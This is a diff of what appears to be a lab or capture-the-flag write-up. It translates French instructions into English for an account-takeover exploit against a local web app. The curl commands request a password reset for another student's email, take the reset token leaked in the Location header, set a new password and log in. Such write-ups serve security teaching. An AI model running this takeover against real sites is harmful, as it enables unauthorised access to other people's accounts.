@@ -21,24 +21,24 @@ http://localhost:4942/forum/r8y1ib6ub8g47u2
 2. give one the student email (benjamin@student.42.tech for example)
 3. enter a new password, validate and login with this email and new password
 
-ou bien ./exploit.sh
-ou bien éxécuter dans une console :
-Requête 1 — Demande de reset et récupération du token dans Location
+Alternatively, run `./exploit.sh` or execute the following commands in a terminal:
+
+Request 1 — Request a password reset and retrieve the token from the `Location` header:
 curl -i -sS \
   -X POST 'http://localhost:4942/reset-password/request' \
   -H 'Content-Type: application/x-www-form-urlencoded' \
   --data-urlencode 'email=dorian@student.42.tech'
 
-Requête 2 — Validation du nouveau mot de passe avec le token reçu
-Remplace <TOKEN_RECUPERE> par la valeur du paramètre token= obtenue dans le header Location de la requête 1 :
+Request 2 — Confirm the new password with the received token.
+Replace `<RECEIVED_TOKEN>` with the value of the `token=` parameter from the `Location` header in request 1:
 curl -i -sS \
   -X POST 'http://localhost:4942/reset-password/confirm' \
   -H 'Content-Type: application/x-www-form-urlencoded' \
   --data-urlencode 'email=dorian@student.42.tech' \
-  --data-urlencode 'token=<TOKEN_RECUPERE>' \
+  --data-urlencode 'token=<RECEIVED_TOKEN>' \
   --data-urlencode 'new_password=TestPass1234'
 
-Requête 3 — Connexion avec l'utilisateur et le nouveau mot de passe
+Request 3 — Log in with the user's email and new password:
 curl -i -sS -c cookies.txt \
   -X POST 'http://localhost:4942/login' \
   -H 'Content-Type: application/x-www-form-urlencoded' \
